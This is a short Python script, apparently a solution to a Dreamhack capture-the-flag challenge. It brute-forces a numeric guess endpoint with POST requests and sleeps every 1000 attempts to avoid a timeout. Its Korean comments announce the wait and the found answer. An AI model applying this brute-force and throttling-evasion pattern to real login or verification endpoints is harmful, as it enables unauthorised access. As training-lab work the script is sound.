import asyncio
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from tqdm import tqdm 
import time

host = "http://host8.dreamhack.games:23183/guess"
res = 0

for i in tqdm(range(5001, 10001)):
    if (i % 1000) == 0:
        print("timeout 때문에 10초간 대기합니다\n")
        time.sleep(10)
        
    tmp = str(i)
    datas = {'guess':(None, tmp)}
    req = requests.post(host, files=datas)
    result = req.json()

    if result['result'] == 'Correct':
        print("정답 : {0}".format(tmp))
        print(req.text)
        break